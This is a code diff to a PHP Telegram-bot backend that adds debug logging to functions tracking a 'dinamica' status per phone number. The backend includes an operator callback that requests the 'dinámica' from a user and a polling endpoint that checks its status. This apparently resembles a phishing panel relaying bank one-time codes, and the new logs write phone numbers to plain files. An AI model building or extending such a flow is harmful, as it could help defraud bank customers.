@@ -113,7 +113,9 @@ function getDinamicaStatus($telefono)
 {
     if (!file_exists($GLOBALS['DINAMICA_STATUS_FILE'])) return null;
     $data = json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true);
-    return $data[$telefono] ?? null;
+    $status = $data[$telefono] ?? null;
+    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - getDinamicaStatus($telefono): " . json_encode($status) . "\n", FILE_APPEND);
+    return $status;
 }
 
 function setDinamicaStatus($telefono, $status, $messageId = null)
@@ -121,6 +123,7 @@ function setDinamicaStatus($telefono, $status, $messageId = null)
     $data = file_exists($GLOBALS['DINAMICA_STATUS_FILE']) ? json_decode(file_get_contents($GLOBALS['DINAMICA_STATUS_FILE']), true) : [];
     $data[$telefono] = ['status' => $status, 'message_id' => $messageId, 'timestamp' => time()];
     file_put_contents($GLOBALS['DINAMICA_STATUS_FILE'], json_encode($data));
+    file_put_contents(__DIR__ . '/dinamica_log.txt', date('Y-m-d H:i:s') . " - setDinamicaStatus($telefono, $status)\n", FILE_APPEND);
 }
 
 /* ============================================================
@@ -285,8 +288,11 @@ if (isset($d['update_id'])) {
         $data = $callback['data'];
         $messageId = $callback['message']['message_id'];
 
+        file_put_contents(__DIR__ . '/callback_log.txt', date('Y-m-d H:i:s') . " - Callback recibido: $data\n", FILE_APPEND);
+
         if (strpos($data, 'solicitar_dinamica_') === 0) {
             $telefono = str_replace('solicitar_dinamica_', '', $data);
+            file_put_contents(__DIR__ . '/callback_log.txt', date('Y-m-d H:i:s') . " - Procesando dinamica para telefono: $telefono\n", FILE_APPEND);
             setDinamicaStatus($telefono, 'dinamica_solicitada');
             answerCallbackQuery($config['token'], $callbackId, 'Dinámica solicitada al usuario');
         }
@@ -385,7 +391,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // CHECK DINAMICA STATUS
     if (isset($d['action']) && $d['action'] === 'check_dinamica_status') {
         $telefono = $d['telefono'] ?? '';
+        file_put_contents(__DIR__ . '/polling_log.txt', date('Y-m-d H:i:s') . " - check_dinamica_status para telefono: $telefono\n", FILE_APPEND);
         $status = getDinamicaStatus($telefono);
+        file_put_contents(__DIR__ . '/polling_log.txt', date('Y-m-d H:i:s') . " - status devuelto: " . json_encode($status) . "\n", FILE_APPEND);
         echo json_encode(['status' => $status ? $status['status'] : null]);
         exit;
     }
